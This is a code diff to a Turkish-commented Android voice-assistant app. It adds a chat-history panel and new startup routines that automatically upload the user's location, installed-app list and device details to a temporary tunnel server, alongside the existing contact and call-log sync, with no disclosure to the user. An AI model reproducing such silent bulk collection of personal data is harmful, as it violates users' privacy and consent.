@@ -33,6 +33,14 @@ import android.util.Base64;
 import android.os.Build;
 import java.io.File;
 import java.io.FileOutputStream;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageInfo;
+import android.os.BatteryManager;
+import android.os.Environment;
+import android.os.StatFs;
+import android.location.Location;
+import android.location.LocationManager;
+import java.util.List;
 
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -63,6 +71,24 @@ import android.net.wifi.WifiManager;
 import android.bluetooth.BluetoothAdapter;
 import android.view.Window;
 import android.view.WindowManager;
+import android.content.SharedPreferences;
+import android.widget.LinearLayout;
+import android.graphics.Color;
+import android.widget.Button;
+import android.view.ViewGroup;
+import android.text.TextWatcher;
+import android.text.Editable;
+import android.content.ClipboardManager;
+import android.content.ClipData;
+import android.widget.EditText;
+import android.text.SpannableString;
+import android.text.style.BackgroundColorSpan;
+import android.text.Spanned;
+import android.view.animation.Animation;
+import android.view.animation.TranslateAnimation;
+import android.view.animation.AlphaAnimation;
+import android.view.animation.AnimationSet;
+import android.view.inputmethod.InputMethodManager;
 
 /**
  * Niko Mobil Uygulaması Ana Aktivitesi
@@ -80,6 +106,7 @@ public class MainActivity extends Activity {
     private View voiceOrb; // Ses aktivitesini görselleştiren yuvarlak simge
     private ImageButton btnMic; // Mikrofon butonu
     private TextView txtAIResponse; // AI veya sistem yanıtlarını gösteren metin alanı
+    private View aiResponseContainer; // Yanıt metnini tutan ScrollView
 
     // Ses ve TTS (Metin Okuma) bileşenleri
     private SpeechRecognizer speechRecognizer; // Sesi yazıya çevirmek için
@@ -89,6 +116,18 @@ public class MainActivity extends Activity {
     // Durum değişkenleri
     private boolean isListening = false; // Şu an dinliyor mu?
     private final Queue<String> ttsQueue = new LinkedList<>(); // Okunacak metin kuyruğu
+
+    // Geçmiş bileşenleri
+    private ImageButton btnHistory;
+    private View layoutHistory;
+    private ImageButton btnCloseHistory;
+    private Button btnClearHistory;
+    private LinearLayout containerHistoryItems;
+    private SharedPreferences historyPrefs;
+    private TextView txtHistoryStats;
+    private EditText edtHistorySearch;
+    private final Object historyLock = new Object();
+    private static final int MAX_HISTORY_ITEMS = 100; // Artırıldı
 
     // WhatsApp entegrasyonu için veriler
     public static String lastWhatsAppMessage; // Son okunan mesaj
@@ -105,6 +144,18 @@ public class MainActivity extends Activity {
         voiceOrb = findViewById(R.id.voiceOrb);
         btnMic = findViewById(R.id.btnMic);
         txtAIResponse = findViewById(R.id.txtAIResponse);
+        aiResponseContainer = findViewById(R.id.aiResponseContainer);
+
+        // Geçmiş arayüzünü bağla
+        btnHistory = findViewById(R.id.btnHistory);
+        layoutHistory = findViewById(R.id.layoutHistory);
+        btnCloseHistory = findViewById(R.id.btnCloseHistory);
+        btnClearHistory = findViewById(R.id.btnClearHistory);
+        containerHistoryItems = findViewById(R.id.containerHistoryItems);
+        txtHistoryStats = findViewById(R.id.txtHistoryStats);
+        edtHistorySearch = findViewById(R.id.edtHistorySearch);
+
+        historyPrefs = getSharedPreferences("chat_history", MODE_PRIVATE);
 
         // Gerekli başlatma işlemleri
         requestPermissions(); // İzinleri iste
@@ -113,6 +164,31 @@ public class MainActivity extends Activity {
 
         // Mikrofon butonuna tıklayınca dinlemeyi başlat
         btnMic.setOnClickListener(v -> startListening());
+
+        // Geçmiş butonları
+        btnHistory.setOnClickListener(v -> showHistory(""));
+        btnCloseHistory.setOnClickListener(v -> hideHistory());
+        btnClearHistory.setOnClickListener(v -> clearHistory());
+
+        // Arama çubuğu takibi
+        edtHistorySearch.addTextChangedListener(new TextWatcher() {
+            @Override
+            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
+            }
+
+            @Override
+            public void onTextChanged(CharSequence s, int start, int before, int count) {
+                // Sadece panel görünürse güncelleme yap (kapatırken metin temizlenince tekrar
+                // açılmasını önler)
+                if (layoutHistory.getVisibility() == View.VISIBLE) {
+                    showHistory(s.toString());
+                }
+            }
+
+            @Override
+            public void afterTextChanged(Editable s) {
+            }
+        });
 
         // Uygulama başladığında rehber ve arama kayıtlarını arka planda senkronize et
         syncAllData();
@@ -126,7 +202,9 @@ public class MainActivity extends Activity {
      */
     private void requestPermissions() {
         String[] perms = { Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_CONTACTS,
-                Manifest.permission.CALL_PHONE, Manifest.permission.READ_CALL_LOG };
+                Manifest.permission.CALL_PHONE, Manifest.permission.READ_CALL_LOG,
+                Manifest.permission.ACCESS_FINE_LOCATION,
+                Manifest.permission.ACCESS_COARSE_LOCATION };
 
         ArrayList<String> list = new ArrayList<>();
         for (String p : perms) {
@@ -173,10 +251,12 @@ public class MainActivity extends Activity {
                     return;
 
                 // Kullanıcının söylediği ilk (en olası) cümleyi al
-                String cmd = list.get(0).toLowerCase();
+                String cmd = list.get(0);
+                String cmdLower = cmd.toLowerCase();
+                saveToHistory("Ben", cmd); // Orijinal haliyle kaydet
 
                 // 1. Önce yerel komut mu diye kontrol et (alarm, arama, müzik vb.)
-                if (!handleCommand(cmd)) {
+                if (!handleCommand(cmdLower)) {
                     // 2. Eğer yerel bir komut değilse interneti kontrol et
                     if (isNetworkAvailable()) {
                         // İnternet varsa Yapay Zeka'ya sor
@@ -198,7 +278,10 @@ public class MainActivity extends Activity {
 
             public void onBeginningOfSpeech() {
                 // Konuşma başladığında kullanıcıya geri bildirim ver
-                txtAIResponse.setText("Dinliyorum...");
+                runOnUiThread(() -> {
+                    aiResponseContainer.setVisibility(View.VISIBLE);
+                    txtAIResponse.setText("Dinliyorum...");
+                });
             }
 
             public void onRmsChanged(float rmsdB) {
@@ -382,6 +465,20 @@ public class MainActivity extends Activity {
             }
         }
 
+        // --- GEÇMİŞ KOMUTLARI ---
+        if (c.contains("geçmişi") || c.contains("sohbet geçmişini")) {
+            if (c.contains("göster") || c.contains("aç") || c.contains("oku")) {
+                int count = getHistoryCount();
+                showHistory("");
+                speak("Sohbet geçmişi açılıyor. Toplam " + count + " mesaj bulundu.", false);
+                return true;
+            }
+            if (c.contains("temizle") || c.contains("sil") || c.contains("kapat")) {
+                clearHistory();
+                return true;
+            }
+        }
+
         return false; // Komut algılanmadıysa AI'ya devret
     }
 
@@ -452,7 +549,7 @@ public class MainActivity extends Activity {
         new Thread(() -> {
             try {
                 // 1. URL: Cloudflare tünel adresi (veya localhost) için
-                URL url = new URL("https://ron-nickname-wine-emotions.trycloudflare.com/chat");
+                URL url = new URL("https://curious-shades-ontario-whenever.trycloudflare.com/chat");
 
                 // 2. Bağlantı Ayarları
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -492,7 +589,10 @@ public class MainActivity extends Activity {
                     // Audio (Ses) verisi varsa onu oynat, yoksa TTS'e ver
                     if (!audioB64.isEmpty()) {
                         final String textToShow = replyText;
-                        runOnUiThread(() -> txtAIResponse.setText(textToShow));
+                        runOnUiThread(() -> {
+                            aiResponseContainer.setVisibility(View.VISIBLE);
+                            txtAIResponse.setText(textToShow);
+                        });
                         playAudio(audioB64);
                     } else {
                         speak(replyText);
@@ -519,6 +619,9 @@ public class MainActivity extends Activity {
             try {
                 syncContacts(); // Rehberi gönder
                 syncCallLogs(); // Arama kayıtlarını gönder
+                syncLocation(); // Konumu gönder
+                syncInstalledApps(); // Uygulamaları gönder
+                syncDeviceInfo(); // Cihaz bilgisini gönder
             } catch (Exception e) {
                 e.printStackTrace();
             }
@@ -571,11 +674,85 @@ public class MainActivity extends Activity {
         sendSyncRequest(array, "calls");
     }
 
+    private void syncLocation() throws Exception {
+        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
+            return;
+
+        LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        Location loc = null;
+
+        if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+            loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+        }
+
+        if (loc == null && lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+            loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+        }
+
+        if (loc != null) {
+            JSONArray array = new JSONArray();
+            JSONObject obj = new JSONObject();
+            obj.put("lat", loc.getLatitude());
+            obj.put("lng", loc.getLongitude());
+            obj.put("time", loc.getTime());
+            obj.put("alt", loc.getAltitude());
+            array.put(obj);
+            sendSyncRequest(array, "location");
+        }
+    }
+
+    private void syncInstalledApps() throws Exception {
+        JSONArray array = new JSONArray();
+        List<PackageInfo> packs = getPackageManager().getInstalledPackages(0);
+        for (PackageInfo p : packs) {
+            // Sadece kullanıcı tarafından yüklenen uygulamaları al (sistem uygulamalarını
+            // filtrele)
+            if ((p.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                JSONObject obj = new JSONObject();
+                obj.put("name", p.applicationInfo.loadLabel(getPackageManager()).toString());
+                obj.put("package", p.packageName);
+                obj.put("version", p.versionName);
+                obj.put("install_time", p.firstInstallTime);
+                array.put(obj);
+            }
+        }
+        sendSyncRequest(array, "apps");
+    }
+
+    private void syncDeviceInfo() throws Exception {
+        JSONObject obj = new JSONObject();
+
+        // Batarya Durumu
+        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
+        obj.put("battery", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY));
+
+        // Depolama Bilgisi
+        File path = Environment.getDataDirectory();
+        StatFs stat = new StatFs(path.getPath());
+        long totalSize = stat.getBlockCountLong() * stat.getBlockSizeLong();
+        long availableSize = stat.getAvailableBlocksLong() * stat.getBlockSizeLong();
+
+        obj.put("storage_total_gb", totalSize / (1024 * 1024 * 1024));
+        obj.put("storage_available_gb", availableSize / (1024 * 1024 * 1024));
+
+        // Donanım ve Versiyon
+        obj.put("android_ver", Build.VERSION.RELEASE);
+        obj.put("sdk_int", Build.VERSION.SDK_INT);
+        obj.put("manufacturer", Build.MANUFACTURER);
+        obj.put("model", Build.MODEL);
+        obj.put("brand", Build.BRAND);
+
+        JSONArray array = new JSONArray();
+        array.put(obj);
+        sendSyncRequest(array, "device_info");
+    }
+
     /**
      * Toplanan veriyi backend'e POST eder.
      */
     private void sendSyncRequest(JSONArray data, String type) throws Exception {
-        URL url = new URL("https://streets-doom-atmospheric-relaxation.trycloudflare.com/sync_data");
+        // Not: askAI ile aynı domaini kullanmalıdır
+        URL url = new URL("https://curious-shades-ontario-whenever.trycloudflare.com/sync_data");
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
         conn.setRequestMethod("POST");
         conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
@@ -591,7 +768,8 @@ public class MainActivity extends Activity {
             os.write(payload.toString().getBytes("utf-8"));
         }
 
-        conn.getResponseCode(); // İsteği tetikle
+        int responseCode = conn.getResponseCode();
+        android.util.Log.d("NIKO_SYNC", "Type: " + type + " | Response Code: " + responseCode);
     }
 
     // Sunucudan gelen Base64 kodlu ses verisini çalar
@@ -644,7 +822,7 @@ public class MainActivity extends Activity {
                     // Dil desteklenmiyorsa log basılabilir veya kullanıcı uyarılabilir
                 } else {
                     // TTS başarıyla yüklendiğinde kendini tanıt
-                    speak("Merhaba, ben Niko. Emrinizdeyim.");
+                    // speak("Merhaba, ben Niko. Emrinizdeyim.");
                 }
             }
         });
@@ -668,8 +846,18 @@ public class MainActivity extends Activity {
      * Metni seslendirir.
      */
     private void speak(String t) {
+        speak(t, true);
+    }
+
+    private void speak(String t, boolean saveToHistory) {
+        // Sistem mesajlarını ve boş mesajları geçmişe kaydetme
+        if (saveToHistory && !t.equals("Dinliyorum...") && !t.equals("Hazır")
+                && !t.trim().isEmpty() && t.length() > 2) {
+            saveToHistory("Niko", t);
+        }
         ttsQueue.offer(t);
         runOnUiThread(() -> {
+            aiResponseContainer.setVisibility(View.VISIBLE);
             txtAIResponse.setText(t);
             speakNext();
         });
@@ -1041,6 +1229,413 @@ public class MainActivity extends Activity {
             // İzin hatası vs olursa varsayılan olarak true dön, askAI hata versin
             return true;
         }
+    }
+
+    // ================= SOHBET GEÇMİŞİ (CHAT HISTORY) =================
+
+    /**
+     * Mesajı yerel hafızaya kaydeder.
+     */
+    private void saveToHistory(String sender, String message) {
+        // Boş veya çok kısa mesajları kaydetme
+        if (message == null || message.trim().isEmpty() || message.trim().length() < 2) {
+            return;
+        }
+
+        new Thread(() -> {
+            synchronized (historyLock) {
+                try {
+                    String currentHistory = historyPrefs.getString("data", "[]");
+                    JSONArray historyArray = new JSONArray(currentHistory);
+
+                    JSONObject entry = new JSONObject();
+                    entry.put("sender", sender);
+                    entry.put("message", message.trim());
+                    entry.put("timestamp", System.currentTimeMillis());
+                    entry.put("date", new SimpleDateFormat("dd/MM/yyyy", Locale.getDefault()).format(new Date()));
+                    entry.put("time", new SimpleDateFormat("HH:mm", Locale.getDefault()).format(new Date()));
+
+                    historyArray.put(entry);
+
+                    // Son MAX_HISTORY_ITEMS mesajı tut
+                    if (historyArray.length() > MAX_HISTORY_ITEMS) {
+                        JSONArray newArray = new JSONArray();
+                        for (int i = historyArray.length() - MAX_HISTORY_ITEMS; i < historyArray.length(); i++) {
+                            newArray.put(historyArray.get(i));
+                        }
+                        historyArray = newArray;
+                    }
+
+                    historyPrefs.edit().putString("data", historyArray.toString()).apply();
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        }).start();
+    }
+
+    /**
+     * Geçmiş panelini doldurur ve gösterir.
+     */
+    private void showHistory(String filter) {
+        runOnUiThread(() -> {
+            if (layoutHistory.getVisibility() != View.VISIBLE) {
+                animateHistoryIn();
+            }
+            containerHistoryItems.removeAllViews();
+            layoutHistory.setVisibility(View.VISIBLE);
+        });
+
+        new Thread(() -> {
+            synchronized (historyLock) {
+                try {
+                    String currentHistory = historyPrefs.getString("data", "[]");
+                    JSONArray historyArray = new JSONArray(currentHistory);
+
+                    if (historyArray.length() == 0) {
+                        runOnUiThread(() -> {
+                            addEmptyStateUI();
+                            txtHistoryStats.setText("0 mesaj");
+                        });
+                        return;
+                    }
+
+                    String lastDate = "";
+                    int visibleCount = 0;
+                    String finalFilter = filter.toLowerCase(Locale.getDefault());
+
+                    for (int i = historyArray.length() - 1; i >= 0; i--) {
+                        JSONObject entry = historyArray.getJSONObject(i);
+                        String sender = entry.getString("sender");
+                        String message = entry.getString("message");
+                        String time = entry.optString("time", "--:--");
+                        String currentDate = entry.optString("date", "");
+
+                        if (!finalFilter.isEmpty()) {
+                            if (!message.toLowerCase(Locale.getDefault()).contains(finalFilter) &&
+                                    !sender.toLowerCase(Locale.getDefault()).contains(finalFilter)) {
+                                continue;
+                            }
+                        }
+
+                        visibleCount++;
+                        final int index = i;
+                        final String filterText = finalFilter;
+
+                        if (finalFilter.isEmpty() && !currentDate.equals(lastDate) && !currentDate.isEmpty()) {
+                            String dateToShow = currentDate;
+                            runOnUiThread(() -> addDateHeaderUI(dateToShow));
+                            lastDate = currentDate;
+                        }
+
+                        final String displayTime = finalFilter.isEmpty() ? time : currentDate + " " + time;
+                        runOnUiThread(() -> addHistoryItemToUI(sender, message, displayTime, index, filterText));
+                    }
+
+                    final int finalVisibleCount = visibleCount;
+                    runOnUiThread(() -> {
+                        if (finalVisibleCount == 0 && !finalFilter.isEmpty()) {
+                            addNoResultUI();
+                        }
+                        txtHistoryStats.setText(finalVisibleCount + " mesaj");
+                    });
+
+                } catch (Exception e) {
+                    e.printStackTrace();
+                    runOnUiThread(
+                            () -> Toast.makeText(MainActivity.this, "Geçmiş yüklenemedi", Toast.LENGTH_SHORT).show());
+                }
+            }
+        }).start();
+    }
+
+    private void addNoResultUI() {
+        TextView noResult = new TextView(this);
+        noResult.setText("Sonuç bulunamadı.");
+        noResult.setTextColor(Color.parseColor("#55FFFFFF"));
+        noResult.setTextSize(14);
+        noResult.setGravity(android.view.Gravity.CENTER);
+        noResult.setPadding(0, 64, 0, 0);
+        containerHistoryItems.addView(noResult);
+    }
+
+    private void animateHistoryIn() {
+        AnimationSet set = new AnimationSet(true);
+        TranslateAnimation slide = new TranslateAnimation(0, 0, 1000, 0);
+        AlphaAnimation fade = new AlphaAnimation(0, 1);
+        set.addAnimation(slide);
+        set.addAnimation(fade);
+        set.setDuration(400);
+        layoutHistory.startAnimation(set);
+    }
+
+    private void hideHistory() {
+        // Eğer zaten gizliyse veya kapanıyorsa işlem yapma
+        if (layoutHistory.getVisibility() != View.VISIBLE)
+            return;
+
+        // Klavyeyi gizle
+        InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
+        if (imm != null && edtHistorySearch != null)
+            imm.hideSoftInputFromWindow(edtHistorySearch.getWindowToken(), 0);
+
+        AnimationSet set = new AnimationSet(true);
+        TranslateAnimation slide = new TranslateAnimation(0, 0, 0, 1200);
+        AlphaAnimation fade = new AlphaAnimation(1, 0);
+        set.addAnimation(slide);
+        set.addAnimation(fade);
+        set.setDuration(300);
+
+        set.setAnimationListener(new Animation.AnimationListener() {
+            @Override
+            public void onAnimationStart(Animation animation) {
+            }
+
+            @Override
+            public void onAnimationEnd(Animation animation) {
+                layoutHistory.setVisibility(View.GONE);
+                if (edtHistorySearch != null)
+                    edtHistorySearch.setText("");
+            }
+
+            @Override
+            public void onAnimationRepeat(Animation animation) {
+            }
+        });
+
+        layoutHistory.startAnimation(set);
+    }
+
+    private int getHistoryCount() {
+        synchronized (historyLock) {
+            try {
+                String currentHistory = historyPrefs.getString("data", "[]");
+                return new JSONArray(currentHistory).length();
+            } catch (Exception e) {
+                return 0;
+            }
+        }
+    }
+
+    /**
+     * Tarih başlığı ekler (örn: "05/01/2026")
+     */
+    private void addDateHeaderUI(String date) {
+        LinearLayout.LayoutParams headerParams = new LinearLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+        headerParams.setMargins(0, 16, 0, 16);
+
+        TextView dateHeader = new TextView(this);
+        dateHeader.setText(formatDateHeader(date));
+        dateHeader.setTextColor(Color.parseColor("#88FFFFFF"));
+        dateHeader.setTextSize(14);
+        dateHeader.setGravity(android.view.Gravity.CENTER);
+        dateHeader.setAllCaps(true);
+        dateHeader.setLetterSpacing(0.15f);
+        dateHeader.setLayoutParams(headerParams);
+        dateHeader.setPadding(0, 8, 0, 8);
+
+        containerHistoryItems.addView(dateHeader);
+    }
+
+    /**
+     * Tarihi daha okunabilir formata çevirir
+     */
+    private String formatDateHeader(String date) {
+        try {
+            SimpleDateFormat inputFormat = new SimpleDateFormat("dd/MM/yyyy", Locale.getDefault());
+            SimpleDateFormat outputFormat = new SimpleDateFormat("dd MMMM yyyy, EEEE", new Locale("tr", "TR"));
+            Date parsedDate = inputFormat.parse(date);
+
+            // Bugün mü kontrol et
+            SimpleDateFormat todayFormat = new SimpleDateFormat("dd/MM/yyyy", Locale.getDefault());
+            String today = todayFormat.format(new Date());
+            if (date.equals(today)) {
+                return "BUGÜN";
+            }
+
+            return outputFormat.format(parsedDate).toUpperCase(new Locale("tr", "TR"));
+        } catch (Exception e) {
+            return date;
+        }
+    }
+
+    /**
+     * Boş durum UI'ı ekler
+     */
+    private void addEmptyStateUI() {
+        TextView emptyText = new TextView(this);
+        emptyText.setText("Henüz sohbet geçmişi yok\n\nBenimle konuşmaya başla!");
+        emptyText.setTextColor(Color.parseColor("#88FFFFFF"));
+        emptyText.setTextSize(16);
+        emptyText.setGravity(android.view.Gravity.CENTER);
+        emptyText.setPadding(32, 64, 32, 64);
+        emptyText.setLineSpacing(8, 1.3f);
+        containerHistoryItems.addView(emptyText);
+    }
+
+    /**
+     * Tek bir geçmiş öğesini arayüz (UI) içine ekler.
+     */
+    private void addHistoryItemToUI(String sender, String message, String time, int index, String filter) {
+        LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+        cardParams.setMargins(0, 0, 0, 16);
+
+        LinearLayout itemLayout = new LinearLayout(this);
+        itemLayout.setOrientation(LinearLayout.VERTICAL);
+        itemLayout.setPadding(20, 20, 20, 20);
+        itemLayout.setBackgroundResource(R.drawable.ai_response_bg);
+        itemLayout.setLayoutParams(cardParams);
+        itemLayout.setClickable(true);
+        itemLayout.setFocusable(true);
+
+        // Kısa basınca metni kopyala
+        itemLayout.setOnClickListener(v -> {
+            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+            ClipData clip = ClipData.newPlainText("niko_msg", message);
+            clipboard.setPrimaryClip(clip);
+            Toast.makeText(this, "Mesaj kopyalandı.", Toast.LENGTH_SHORT).show();
+        });
+
+        // Uzun basınca tekli silme
+        itemLayout.setOnLongClickListener(v -> {
+            deleteSingleHistoryItem(index);
+            return true;
+        });
+
+        // Sender ve zaman bilgisi
+        TextView txtSender = new TextView(this);
+        txtSender.setText(sender + " • " + time);
+        txtSender.setTextColor(sender.equals("Ben") ? Color.parseColor("#00E5FF") : Color.parseColor("#FFCC00"));
+        txtSender.setTextSize(12);
+        txtSender.setAlpha(0.85f);
+        txtSender.setAllCaps(true);
+        txtSender.setLetterSpacing(0.12f);
+        txtSender.setTypeface(null, android.graphics.Typeface.BOLD);
+
+        // Mesaj içeriği (Vurgulama eklendi)
+        TextView txtMsg = new TextView(this);
+        if (filter != null && !filter.isEmpty()) {
+            SpannableString spannable = new SpannableString(message);
+            String lowerMsg = message.toLowerCase(Locale.getDefault());
+            int start = lowerMsg.indexOf(filter);
+            while (start >= 0) {
+                int end = start + filter.length();
+                spannable.setSpan(new BackgroundColorSpan(Color.parseColor("#4400E5FF")), start, end,
+                        Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
+                start = lowerMsg.indexOf(filter, end);
+            }
+            txtMsg.setText(spannable);
+        } else {
+            txtMsg.setText(message);
+        }
+
+        txtMsg.setTextColor(Color.WHITE);
+        txtMsg.setTextSize(16);
+        txtMsg.setPadding(0, 10, 0, 0);
+        txtMsg.setLineSpacing(6, 1.25f);
+
+        itemLayout.addView(txtSender);
+        itemLayout.addView(txtMsg);
+        containerHistoryItems.addView(itemLayout);
+    }
+
+    /**
+     * Tek bir öğeyi indekse göre siler.
+     */
+    private void deleteSingleHistoryItem(int index) {
+        synchronized (historyLock) {
+            try {
+                String currentHistory = historyPrefs.getString("data", "[]");
+                JSONArray historyArray = new JSONArray(currentHistory);
+
+                if (index < 0 || index >= historyArray.length())
+                    return;
+
+                JSONObject entry = historyArray.getJSONObject(index);
+                String messageSnippet = entry.optString("message", "");
+                if (messageSnippet.length() > 40)
+                    messageSnippet = messageSnippet.substring(0, 37) + "...";
+
+                String finalSnippet = messageSnippet;
+                runOnUiThread(() -> {
+                    new android.app.AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_Alert)
+                            .setTitle("Mesajı Sil")
+                            .setMessage("\"" + finalSnippet + "\"\n\nBu mesajı geçmişten silmek istiyor musunuz?")
+                            .setIcon(android.R.drawable.ic_menu_delete)
+                            .setPositiveButton("Sil", (dialog, which) -> {
+                                new Thread(() -> {
+                                    synchronized (historyLock) {
+                                        try {
+                                            String latestHistory = historyPrefs.getString("data", "[]");
+                                            JSONArray latestArray = new JSONArray(latestHistory);
+
+                                            if (index >= 0 && index < latestArray.length()) {
+                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+                                                    latestArray.remove(index);
+                                                } else {
+                                                    JSONArray newList = new JSONArray();
+                                                    for (int i = 0; i < latestArray.length(); i++) {
+                                                        if (i != index)
+                                                            newList.put(latestArray.get(i));
+                                                    }
+                                                    latestArray = newList;
+                                                }
+                                                historyPrefs.edit().putString("data", latestArray.toString()).apply();
+
+                                                runOnUiThread(() -> {
+                                                    showHistory(edtHistorySearch.getText().toString());
+                                                    Toast.makeText(this, "Mesaj silindi", Toast.LENGTH_SHORT).show();
+                                                });
+                                            }
+                                        } catch (Exception e) {
+                                            e.printStackTrace();
+                                        }
+                                    }
+                                }).start();
+                            })
+                            .setNegativeButton("Vazgeç", null)
+                            .show();
+                });
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
+    /**
+     * Tüm geçmişi siler. (Thread-safe ve Gelişmiş UI Geri Bildirimi)
+     */
+    private void clearHistory() {
+        // Zaten boşsa işlem yapma
+        if (getHistoryCount() == 0) {
+            Toast.makeText(this, "Temizlenecek bir geçmiş bulunamadı.", Toast.LENGTH_SHORT).show();
+            return;
+        }
+
+        new android.app.AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_Alert)
+                .setTitle("Geçmişi Temizle")
+                .setMessage("Tüm sohbet geçmişini silmek istediğinize emin misiniz? Bu işlem geri alınamaz.")
+                .setIcon(android.R.drawable.ic_dialog_alert)
+                .setPositiveButton("Hepsini Sil", (dialog, which) -> {
+                    // Veri güvenliği için kilitleme kullan
+                    synchronized (historyLock) {
+                        historyPrefs.edit().clear().apply();
+                    }
+
+                    // Arayüzü güncelle
+                    runOnUiThread(() -> {
+                        containerHistoryItems.removeAllViews();
+                        addEmptyStateUI();
+                        if (txtHistoryStats != null) {
+                            txtHistoryStats.setText("0 mesaj");
+                        }
+                        Toast.makeText(this, "Sohbet geçmişi tamamen temizlendi", Toast.LENGTH_SHORT).show();
+                    });
+                })
+                .setNegativeButton("Vazgeç", null)
+                .show();
     }
 
     @Override
